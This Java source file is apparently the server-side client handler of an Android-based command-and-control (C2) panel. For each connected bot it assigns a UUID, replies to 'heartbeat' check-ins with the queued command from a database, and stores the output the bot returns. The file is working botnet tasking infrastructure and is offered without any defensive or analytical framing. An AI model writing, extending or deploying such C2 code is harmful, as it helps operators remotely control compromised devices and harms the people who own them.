package c2.mobile.mobilec2;

import android.util.Log;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.ArrayList;
import java.util.UUID;

public class C2ClientThread extends Thread {
    private Socket socket;
    private BufferedReader in;
    private PrintWriter out;
    private UUID uuid; // placeholder
    private CommandDatabase commandDatabase;

    public C2ClientThread(Socket socket, CommandDatabase commandDatabase) {
        super("C2ClientThread");
        this.socket = socket;
        this.commandDatabase = commandDatabase;
        try {
            this.in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            this.out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())), true);
            this.uuid = UUID.randomUUID();
            boolean bool = commandDatabase.insertIntoDatabase(uuid.toString(), "", "");

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void run() {
        while (true){
            String str = null;
            try {
                str = in.readLine();
                if(str != null){
                    Log.i("received response from server", str);
                    if(str.equals("uuid")){
                        out.println(uuid.toString());
                    }

                    if(str.equals("heartbeat")){
                        //str should be heartbeat
                        //if it is, fetch command from database
                        ArrayList<String> cmds = commandDatabase.getFromDatabase(uuid.toString(), BotEntryContract.BotEntry.command);

                        //if there is a command, send command and readLine for output
                        if (!cmds.get(0).equals("")){
                            out.println(cmds.get(0));
                            String output = in.readLine();
                            commandDatabase.updateDatabase(uuid.toString(), "", output);

                            //if there is no command, send "none"
                        } else {
                            out.println("None");
                        }

                    }else if(str.startsWith("cmd")){
                        ArrayList<String> cmds = commandDatabase.getFromDatabase(uuid.toString(), BotEntryContract.BotEntry.command);
                        out.println(cmds.get(0));
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public void close(){
        try {
            out.close();
            in.close();
            socket.close();
        } catch (IOException e) {
            //
        }
    }
}
